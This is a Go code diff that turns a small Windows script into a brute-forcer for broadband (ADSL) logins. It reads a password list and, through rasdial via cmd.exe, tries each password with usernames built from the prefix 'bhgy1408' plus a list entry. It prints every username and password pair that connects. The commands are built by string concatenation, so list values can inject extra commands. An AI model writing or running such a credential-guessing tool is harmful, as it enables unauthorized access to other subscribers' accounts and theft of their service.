@@ -7,35 +7,42 @@ import (
 	"io"
 	"os"
 	"os/exec"
-	"strings"
-	"stack"
-	"container/heap"
+	//"stack"
+	//"container/heap"
 )
 
 var items =make(map[string]int) 
 
-func executeCmd(cmd string) string {
-	output, err := exec.Command("cmd.exe", "/c", cmd).Output()
-	check(err)
-	return string(output)
+func executeCmd(command string) error{
+	cmd := exec.Command("cmd.exe", "/c", command)
+	err := cmd.Run()
+	/*if err == nil {
+		fmt.Println("成功")
+	}else {
+		fmt.Println("什么垃圾玩意")
+	}*/
+	return err
 }
 
 func connAdsl(adslTitle string, adslName string, adslPass string) {
 	adslCmd := "rasdial " + adslTitle + " " + adslName + " " + adslPass
-	tempCmd := executeCmd(adslCmd)
-	if strings.Index(tempCmd, "已连接") > 0 {
+	err:=executeCmd(adslCmd)
+	if err==nil {
 		fmt.Println("用户名: " + adslName + "  密码: " + adslPass)
+		cutAdsl("宽带连接")
+	}else{
+		fmt.Println("什么垃圾玩意")
 	}
 
 }
 
 func cutAdsl(adslTitle string) {
 	cutCmd := "rasdial " + adslTitle + " /disconnect"
-	result := executeCmd(cutCmd)
-	if strings.Index(result, "没有连接") != -1 {
-		fmt.Println(adslTitle + " 连接不存在")
-	} else {
+	err := executeCmd(cutCmd)
+	if err==nil {
 		fmt.Println("连接已断开")
+	} else {
+		fmt.Println(adslTitle + " 连接不存在")
 	}
 
 }
@@ -49,7 +56,7 @@ func check(e error) {
 }
 
 func Readfile() {
-	userfile := "./allpasswd.txt"
+	userfile := "./allpasswdtest.txt"
 	fl, err := os.Open(userfile)
 	if err != nil {
 		fmt.Println(userfile, err)
@@ -86,8 +93,8 @@ func main1() {
 	cutAdsl("宽带")
 }
 
-func Cmd() {
-	cmd := exec.Command("cmd.exe", "/c", "mkdird bbb")
+func Cmd(command string) {
+	cmd := exec.Command("cmd.exe", "/c", command)
 	err := cmd.Run()
 	if err == nil {
 		fmt.Println("成功")
@@ -102,7 +109,7 @@ func initItem(line string,i int){
 
 func Pass(){
 	Readfile()
-	pq:=make(stack.PriorityQueue,len(items))
+	/*pq:=make(stack.PriorityQueue,len(items))
 	i:=0
 	for key,priority:=range items{
 		pq[i]=&stack.Item{
@@ -113,12 +120,17 @@ func Pass(){
 		i++
 	}
 	heap.Init(&pq)
+	*/
 	
 	for key,_:=range items{
-		for pq.Len()>0{
+		/*for pq.Len()>0{
 			item:=heap.Pop(&pq).(*stack.Item)
 			fmt.Printf("%s\t%.2d:%s\n",key,item.Priority,item.Value)
+		}*/
+		for passwd,_:=range items{
+			connAdsl("宽带连接","bhgy1408"+key,passwd)
 		}
+		
 	}
 	
 }
